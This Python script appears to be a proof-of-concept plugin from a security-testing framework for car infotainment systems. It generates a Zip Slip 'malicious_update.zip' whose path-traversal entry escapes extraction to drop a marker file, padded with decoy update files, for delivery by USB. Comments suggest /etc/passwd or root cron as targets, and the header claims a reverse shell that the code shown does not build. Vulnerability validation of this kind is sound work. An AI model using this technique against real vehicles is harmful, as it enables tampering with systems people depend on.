#!/usr/bin/env python3
"""
PoC Name: USB Path Traversal Injection
Identifier: CWE-22
Component: Application Stack
Category: Application
Severity: Critical
CVSS: 8.5
Description: 恶意USB目录结构利用路径操作获取反弹Shell
Prerequisites: 本机权限。生成后须手动挂载至U盘。
Usage: python3 08_CWE_22_USB_Path_Injection_Active_Validation.py
"""
from __future__ import annotations

import sys
import os
import shutil
import time
from iv_plugin_base import IVIVulnerabilityPlugin

VULN = {
    "id":             0,
    "cve":            "CWE-22",
    "year":           22,
    "domain":         "application",
    "vendor_product": "Unknown",
    "component":      "Unknown",
    "type":           "Unknown",
    "summary":        "USB Path Injection",
    "source_url":     "https://cwe.mitre.org/data/definitions/22.html",
    "affected":       [{"vendor": "Unknown", "product": "Unknown", "versions": []}],
    "references":     ["https://cwe.mitre.org/data/definitions/22.html"],
    "signature_tokens": ["CWE-22"],
}


def _run_poc(plugin, vuln=None) -> dict:
    """
    CWE-22 主动探针包装（兼容旧式 exploit() 实现）。
    通过调用插件自身的 exploit 逻辑并将结果标准化为 detection_confidence 格式。
    """
    try:
        result = plugin.exploit() or {}
    except Exception as exc:
        result = {"error": str(exc)}

    vulnerable = result.get("vulnerable", None)
    evidence = {
        "cve":       vuln.get("cve", "CWE-22") if vuln else "CWE-22",
        "target":    getattr(plugin, "target_ip", "unknown"),
        "technique": "legacy exploit() wrapper",
        "raw":       str(result)[:300],
    }

    # 根据是否有主动网络调用推断等级
    level = "B" if vulnerable is True else ("C" if vulnerable is False else "D")
    try:
        from probe_utils import detection_confidence as _detection_confidence
        return _detection_confidence(level, evidence, vulnerable=vulnerable)
    except ImportError:
        return {
            "detection_confidence": {
                "level": level, "vulnerable": vulnerable,
                "evidence": evidence, "method": "legacy_wrapper",
            }
        }


class UsbPathTraversalPlugin(IVIVulnerabilityPlugin):
    meta_display_id = "POC-APP-008"
    meta_poc_name = 'CWE-22 USB Path Injection Active Validation'
    meta_cve_id = "CWE-22"
    meta_source_url = "https://cwe.mitre.org/data/definitions/22.html"
    meta_references = ['https://cwe.mitre.org/data/definitions/22.html']
    meta_severity = "Critical"
    meta_protocol = "unknown"
    meta_target_os = ["all"]
    meta_required_params = []
    meta_profiles         = ["application"]
    is_disruptive = False
    meta_destructive_level = "Safe"

    def check_prerequisites(self):
        self.marker_path = self.params.get("marker_path", "/tmp/pwned_by_zip_slip")
        self.observe_seconds = float(self.params.get("observe_seconds", 5))
        return True

    def exploit(self):
        self.logger.info("准备构造路径遍历(Path Traversal)的恶意文件结构...")
        
        # IVI 系统如果在读取文件时不处理 `../`，会被解压或复制脱离挂载目录
        # 这里演示生成包含 ../../ 的 zip 或者符号链接与特殊名称目录
        
        # 很多早期的 Linux / Android IVI ，解压车机升级包 zip 时可以直接解压出 ../../ 
        # 本机演示，我们借用 Python 的 zipfile 生成恶意升级包
        payload_dir = "/tmp/ivi_usb_payloads"
        os.makedirs(payload_dir, exist_ok=True)
        
        zip_path = os.path.join(payload_dir, "malicious_update.zip")
        
        try:
            import zipfile
            self.logger.info("构建特制的恶意 Zip 升级包...")
            
            # 这是一个典型的 Zip Slip 漏洞攻击包
            # 我们将写入一个文件名为 "../../../../../../../etc/passwd" 或 "/var/spool/cron/root" 的条目
            escaped_target = self.marker_path.lstrip("/")
            malicious_entry = "../../../../../../../../" + escaped_target
            
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as z:
                # 写入恶意条目
                z.writestr(malicious_entry, b"Pwned! This file escaped the extraction directory\\n")
                # 写入正常诱饵供系统读取
                z.writestr("update_info.txt", b"Version: 2.0\\nAuthor: AutoSec")
                z.writestr("logo.png", b"FAKE_PNG_HEADER")
                
            self.logger.warning(f"[SUCCESS] 恶意 Zip Slip 更新包已在本地生成！")
            self.logger.warning(f"  绝对路径: {zip_path}")
            self.logger.warning("[!] 请将此包拷入U盘。当车机尝试读取此ZIP进行OTA、壁纸更新或日志导入时：")
            self.logger.warning(f"    系统将灾难性地把木马文件释放到车机的 {self.marker_path} ! ")
            time.sleep(self.observe_seconds)
            if os.path.exists(self.marker_path):
                return {
                    "status": "success",
                    "vulnerable": True,
                    "details": f"Observed path-traversal marker file at {self.marker_path} after processing malicious ZIP."
                }
            
            return {
                "status": "success",
                "vulnerable": False,
                "details": f"已生成 ZIP Slip 样本 {zip_path}，但未在 {self.marker_path} 观察到自动化路径逃逸证据。"
            }

        except Exception as e:
            self.logger.error(f"构建压缩包发生错误: {str(e)}")
            return {"status": "error", "details": str(e)}

if __name__ == "__main__":
    plugin = UsbPathTraversalPlugin({})
    plugin.run_verify()
